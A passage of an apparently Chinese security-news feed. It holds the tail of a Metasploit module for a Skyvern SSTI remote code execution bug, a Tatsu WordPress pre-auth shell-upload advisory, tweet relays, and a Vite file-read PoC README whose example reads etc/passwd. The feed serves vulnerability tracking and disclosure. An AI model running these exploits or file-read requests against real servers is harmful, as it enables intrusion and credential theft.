class="hljs-string">&#x27;/api/v1/workflows/&#x27;</span>, <span class="hljs-variable">@workflow_id</span>, <span class="hljs-string">&#x27;/run&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; &#123; <span class="hljs-symbol">workflow_id:</span> <span class="hljs-variable">@workflow_id</span> &#125;.to_json<br>    &#125;)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> res_json.fetch(<span class="hljs-string">&#x27;workflow_id&#x27;</span>, <span class="hljs-literal">nil</span>) |<span class="hljs-params"></span>| res_json.fetch(<span class="hljs-string">&#x27;workflow_run_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;Target is probably not Skyvern&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>(<span class="hljs-string">&#x27;Failed to get additional information - target is either not Skyvern or you used incorrect API key&#x27;</span>) <span class="hljs-keyword">unless</span> res_json<br><br>    <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Detected</span>(<span class="hljs-string">&#x27;Target is Skyvern&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    create_workflow<br>    trigger_workflow<br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Skyvern SSTI Remote Code Execution&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_4102502433/"/>
    <id>http://example.com/2025/06/27/twitter_4102502433/</id>
    <published>2025-06-27T12:00:26.241Z</published>
    <updated>2025-06-27T12:00:26.240Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> #BHEU工具征集现已开放！加入我们，2025年12月10日至11日在伦敦的开源工具演示区Arsenal，研究人员和开发者可以在这里展示他们的创新项目。不要错过这个连接、合作并提升你工作的机会！📩 立即提交你的项目 &gt;&gt; <a href="https://t.co/ybLPcp5gaN">https://t.co/ybLPcp5gaN</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938557694564016582">https://x.com/BlackHatEvents/status/1938557694564016582</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #BHEU工具征集现已开放！加入我们，2025年12月10日至11日在伦敦的开源工具演示区Arsenal，研究人员和开发者可以在这里展示他们的创新</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-6543 Zero Day Exploitation of NetScaler ADC and NetScaler Gateway</title>
    <link href="http://example.com/2025/06/27/blog_1122878314/"/>
    <id>http://example.com/2025/06/27/blog_1122878314/</id>
    <published>2025-06-27T12:00:07.441Z</published>
    <updated>2025-06-27T12:00:07.440Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-netscaler-adc-and-netscaler-gateway/">https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-netscaler-adc-and-netscaler-gateway/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-netscaler-adc-and-netscaler-gateway/&quot;&gt;https:/</summary>
      
    
    
    
    <category term="安全博客" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="www.rapid7.com" scheme="http://example.com/tags/www-rapid7-com/"/>
    
  </entry>
  
  <entry>
    <title>fofabot twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_2716605998/"/>
    <id>http://example.com/2025/06/27/twitter_2716605998/</id>
    <published>2025-06-27T11:00:29.430Z</published>
    <updated>2025-06-27T11:00:29.428Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> fofabot</p><p><strong>推文：</strong> ⚠️⚠️ CVE-2025-36038（CVSS 9.0）此漏洞可能允许通过恶意构造的序列化负载进行未认证的远程代码执行（RCE），对企业级Java应用构成严重威胁。<br>🎯在<a href="https://t.co/uLIbgJcaq5%E4%B8%8A%E5%8F%91%E7%8E%B0%E8%BF%91%E4%B8%80%E5%B9%B4%E5%86%85%E6%9C%8916k+%E7%BB%93%E6%9E%9C%E3%80%82">https://t.co/uLIbgJcaq5上发现近一年内有16k+结果。</a><br>🔗FOFA链接: <a href="https://t.co/IUBf1jrFGY">https://t.co/IUBf1jrFGY</a><br>FOFA查询:app&#x3D;”WebSphere-App-Server”<br>🔖参考: <a href="https://t.co/IBN87DgvTd">https://t.co/IBN87DgvTd</a><br>#OSINT #FOFA #网络安全 #漏洞</p><p><strong>链接：</strong> <a href="https://x.com/fofabot/status/1938545240996196580">https://x.com/fofabot/status/1938545240996196580</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; fofabot&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️⚠️ CVE-2025-36038（CVSS 9.0）此漏洞可能允许通过恶意构造的序列化负载进行未认证的远程代码执行（RCE），对企业级Java应用构成严重</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="fofabot" scheme="http://example.com/tags/fofabot/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-25094</title>
    <link href="http://example.com/2025/06/27/other_568340431/"/>
    <id>http://example.com/2025/06/27/other_568340431/</id>
    <published>2025-06-27T11:00:07.187Z</published>
    <updated>2025-06-27T11:00:07.184Z</updated>
    
    <content type="html"><![CDATA[<p><strong>描述：</strong> The Tatsu WordPress plugin before 3.3.12 add_custom_font action can be used without prior authentication to upload a rogue zip file which is uncompressed under the WordPress’s upload directory. By adding a PHP shell with a filename starting with a dot “.”, this can bypass extension control implemented in the plugin. Moreover, there is a race condition in the zip extraction process which makes the shell file live long enough on the filesystem to be callable by an attacker.</p><hr><p>Based on <a href="https://darkpills.com/wordpress-tatsu-builder-preauth-rce-cve-2021-25094/">technical analysis</a>, the <code>Attacker Value</code> of the vulnerability is <strong>high</strong> because it’s a popular WordPress plugin that has been exploited in the wild. Although it is an older vulnerability, we’ve added a <a href="https://github.com/rapid7/metasploit-framework/pull/20301">module</a> for it, as it may still be relevant to the older, unpatched version of Tatsu. The exploitability is marked as <strong>easy</strong> because all the attacker needs is a malicious <code>zip</code> file with a hidden PHP payload. It should also be noted that the exploitation does not require any credentials, and attackers can weaponize this vulnerability.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; The Tatsu WordPress plugin before 3.3.12 add_custom_font action can be used without prior authentication to upload a</summary>
      
    
    
    
    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="attackerkb.com" scheme="http://example.com/tags/attackerkb-com/"/>
    
  </entry>
  
  <entry>
    <title>Vite 任意文件读取漏洞</title>
    <link href="http://example.com/2025/06/27/github_623277203/"/>
    <id>http://example.com/2025/06/27/github_623277203/</id>
    <published>2025-06-27T10:45:18.115Z</published>
    <updated>2025-06-27T10:45:18.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Vite 任意文件读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-30208</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> CVE-2025-30208是Vite开发服务器中的一个中危任意文件读取漏洞。远程攻击者可以通过发送特制的HTTP请求读取服务器上的任何文件，前提是Vite开发服务器暴露在网络中（例如使用<code>--host</code>或配置<code>server.host</code>）。此漏洞可能导致敏感文件如<code>/etc/passwd</code>、<code>.env</code>、源代码或配置文件被读取，进而引发凭证盗窃、信息泄露或其他进一步攻击。</p><p><strong>产品厂商：</strong> Vite</p><p><strong>产品名称：</strong> Vite Development Server</p><p><strong>影响版本：</strong> 6.2.0 &lt;&#x3D; Vite &lt;&#x3D; 6.2.2, 6.1.0 &lt;&#x3D; Vite &lt;&#x3D; 6.1.1, 6.0.0 &lt;&#x3D; Vite &lt;&#x3D; 6.0.11, 5.0.0 &lt;&#x3D; Vite &lt;&#x3D; 5.4.14, Vite &lt;&#x3D; 4.5.9</p><p><strong>来源：</strong> <a href="https://github.com/ThemeHackers/CVE-2025-30208">https://github.com/ThemeHackers/CVE-2025-30208</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-30208.py</li><li>README.md</li><li>requirements.txt</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p><img src="https://img.shields.io/badge/Vulnerability-Arbitrary%20File%20Read-red" alt="Vulnerability"><br><img src="https://img.shields.io/badge/Vite-5.x%2C%206.x-blue" alt="Vite"><br><img src="https://img.shields.io/badge/Status-Exploit%20PoC-brightgreen" alt="Status"></p><hr><blockquote><p><strong>CVE-2025-30208</strong> — Vite Arbitrary File Read Vulnerability</p></blockquote><hr><h3 id="📑-Table-of-Contents"><a href="#📑-Table-of-Contents" class="headerlink" title="📑 Table of Contents"></a>📑 Table of Contents</h3><ul><li><a href="#overview">Overview</a></li><li><a href="#impact">Impact</a></li><li><a href="#affected-versions">Affected Versions</a></li><li><a href="#patched-versions">Patched Versions</a></li><li><a href="#how-to-test">How to Test</a></li><li><a href="#example-usage">Example Usage</a></li><li><a href="#mitigation">Mitigation</a></li><li><a href="#references">References</a></li></ul><hr><h3 id="📝-Overview"><a href="#📝-Overview" class="headerlink" title="📝 Overview"></a>📝 Overview</h3><p><strong>CVE-2025-30208</strong> is an <strong>Arbitrary File Read</strong> vulnerability in multiple versions of the Vite Development Server. Remote attackers can read any file on the server by sending specially crafted HTTP requests, if the Vite dev server is exposed to the network (e.g., using <code>--host</code> or configuring <code>server.host</code>).</p><blockquote><p><strong>Type:</strong> Arbitrary File Read<br><strong>CVE:</strong> CVE-2025-30208<br><strong>Component:</strong> Vite Dev Server</p></blockquote><hr><h3 id="🚨-Impact"><a href="#🚨-Impact" class="headerlink" title="🚨 Impact"></a>🚨 Impact</h3><ul><li>Read sensitive files such as <code>/etc/passwd</code>, <code>.env</code>, source code, or configuration files.</li><li>May lead to credential theft, information disclosure, or further attacks.</li></ul><hr><h3 id="📦-Affected-Versions"><a href="#📦-Affected-Versions" class="headerlink" title="📦 Affected Versions"></a>📦 Affected Versions</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= Vite &lt;= <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> &lt;= Vite &lt;= <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= Vite &lt;= <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">11</span><br><span class="hljs-attribute">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= Vite &lt;= <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">14</span><br><span class="hljs-attribute">Vite</span> &lt;= <span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><blockquote><p>⚠️ <strong>Note:</strong> Exploitable only if the Vite dev server is accessible from the network (e.g., started with <code>vite --host</code>).</p></blockquote><hr><h3 id="🛡️-Patched-Versions"><a href="#🛡️-Patched-Versions" class="headerlink" title="🛡️ Patched Versions"></a>🛡️ Patched Versions</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Vite</span> &gt;= <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">15</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> &lt;= Vite &lt; <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><h3 id="🧪-How-to-Test"><a href="#🧪-How-to-Test" class="headerlink" title="🧪 How to Test"></a>🧪 How to Test</h3><p>This repository provides a script (<code>CVE-2025-30208.py</code>) to test if a target Vite server is vulnerable.</p><h4 id="1-Install-Dependencies"><a href="#1-Install-Dependencies" class="headerlink" title="1. Install Dependencies"></a>1. Install Dependencies</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure><h4 id="2-Run-the-Script"><a href="#2-Run-the-Script" class="headerlink" title="2. Run the Script"></a>2. Run the Script</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-30208.py<br></code></pre></td></tr></table></figure><h4 id="3-Set-Target-Options"><a href="#3-Set-Target-Options" class="headerlink" title="3. Set Target Options"></a>3. Set Target Options</h4><ul><li><code>set RHOST &lt;target IP or domain&gt;</code></li><li><code>set RPORT &lt;Vite dev server port&gt;</code></li><li><code>set COMMAND &lt;file path to read, e.g., etc/passwd&gt;</code></li></ul><h4 id="4-Run-the-Exploit"><a href="#4-Run-the-Exploit" class="headerlink" title="4. Run the Exploit"></a>4. Run the Exploit</h4><ul><li>Use the <code>run</code> or <code>exploit</code> command to test the target.</li><li>If vulnerable content is found, use the <code>pull</code> command to save the leaked data as HTML or JSON.</li></ul><hr><h3 id="💻-Example-Usage"><a href="#💻-Example-Usage" class="headerlink" title="💻 Example Usage"></a>💻 Example Usage</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">CVE-2025-30208 &gt; set RHOST 192.168.1.100<br>CVE-2025-30208 &gt; set RPORT 5173<br>CVE-2025-30208 &gt; set COMMAND etc/passwd<br>CVE-2025-30208 &gt; run<br>CVE-2025-30208 &gt; pull<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-Mitigation"><a href="#🛡️-Mitigation" class="headerlink" title="🛡️ Mitigation"></a>🛡️ Mitigation</h3><ul><li><strong>Upgrade</strong> Vite to a patched version as listed above.</li><li><strong>Do not expose</strong> the Vite dev server to public or untrusted networks.</li><li><strong>Restrict access</strong> using firewalls or reverse proxies.</li></ul><hr><h3 id="📚-References"><a href="#📚-References" class="headerlink" title="📚 References"></a>📚 References</h3><ul><li><a href="https://github.com/vitejs/vite">Vite Official Repository</a></li><li><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></li><li><a href="https://github.com/advisories">GitHub Advisory Database</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Vite 任意文件读取漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>offsectraining twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_2082538927/"/>
    <id>http://example.com/2025/06/27/twitter_2082538927/</id>
    <published>2025-06-27T10:00:29.715Z</published>
    <updated>2025-06-27T10:00:29.715Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> offsectraining</p><p><strong>推文：</strong> 我们将在7月1日至3日前往马来西亚吉隆坡参加CYDES 2025。来153a展位与我们的团队见面吧！🇲🇾 #OffSec #CYDES2025 #网络安全 #网络防御 @CYDESMY</p><p><strong>链接：</strong> <a href="https://x.com/offsectraining/status/1938537787621335239">https://x.com/offsectraining/status/1938537787621335239</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offsectraining&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 我们将在7月1日至3日前往马来西亚吉隆坡参加CYDES 2025。来153a展位与我们的团队见面吧！🇲🇾 #OffSec #CYDES2025</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="offsectraining" scheme="http://example.com/tags/offsectraining/"/>
    
  </entry>
  
</feed>
